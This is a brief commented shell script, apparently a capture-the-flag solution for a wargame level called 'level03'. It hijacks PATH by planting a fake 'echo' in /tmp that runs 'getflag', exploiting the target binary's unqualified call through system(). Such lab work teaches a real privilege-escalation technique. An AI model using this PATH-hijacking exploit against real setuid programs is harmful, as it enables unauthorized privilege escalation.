# Exploit the fact that level03 calls
# system("/usr/bin/env echo Exploit me")
# by changing the path so that the executable we created is called instead of
# the system echo.
# Our echo just calls getflag
mkdir /tmp/sticky
cd /tmp/sticky
echo '#!/bin/sh' > echo
echo 'getflag' >> echo
chmod 755 echo
export PATH="/tmp/sticky:$PATH"
~/level03
